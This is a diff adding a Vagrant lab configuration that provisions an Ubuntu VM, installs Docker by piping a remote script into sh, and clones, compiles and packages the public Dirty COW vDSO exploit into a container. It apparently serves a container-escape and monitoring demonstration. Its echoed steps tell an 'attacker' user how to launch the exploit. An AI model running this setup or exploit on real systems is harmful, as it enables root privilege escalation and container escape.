@@ -1,0 +1,35 @@
+--- 
+- 
+  box: puppetlabs/ubuntu-14.04-64-nocm
+  cpu: 2
+  ip: "10.2.2.151"
+  name: vDSO-exploit
+  forward_ports: 
+      - { guest: 6666, host: 6666 }
+         
+  ram: 2048
+  shell_commands:
+      - { shell: 'apt-get update -y && apt-get install -y wget git'}   
+      - { shell: 'wget -qO- https://get.docker.com/ | sh'}
+      - { shell: 'sysctl -w vm.max_map_count=262144'}
+      - { shell: 'umask 0022'}
+      - { shell: 'sudo curl -o /usr/local/bin/docker-compose -L "https://github.com/docker/compose/releases/download/1.14.0-rc1/docker-compose-$(uname -s)-$(uname -m)" ' }
+      - { shell: 'sudo chmod 700 /usr/local/bin/docker-compose'}
+      - { shell: 'git clone https://github.com/scumjr/dirtycow-vdso.git'}
+      - { shell: 'sudo su '}
+      - { shell: 'echo "---- Setup the system and creating proof ----"  '}
+      - { shell: 'docker ps && echo "This is the host" > /root/this_is_the_host '}
+      - { shell: 'echo "---- Installing the compiler and compiling the exploit ----" '}
+      - { shell: 'cd /home/vagrant/dirtycow-vdso && apt-get install nasm && make '}
+      - { shell: 'echo "---- Copying the exploit to the Docker Container ----" '}
+      - { shell: 'cp /home/vagrant/dirtycow-vdso/0xdeadbeef /home/vagrant/vDSO-exploit/foo' }
+      - { shell: 'echo "---- Building the Docker Image ----" '}
+      - { shell: 'cd /home/vagrant/vDSO-exploit && docker build -t ubuntu-dirtycow .'}
+      - { shell: 'echo "---- Now you can start the Docker Image as user attacker by running: ----" '}
+      - { shell: 'echo "cd /home/vagrant/vDSO-exploit && docker run -it -p 80:80 ubuntu-dirtycow /bin/sh" '} 
+      - { shell: 'echo "---- When monitoring is ready you can launch the exploit by running: ----" '}
+      - { shell: 'echo "~/foo/0xdeadbeef http://127.0.0.1:80" '} 
+      
+      
+      
+      
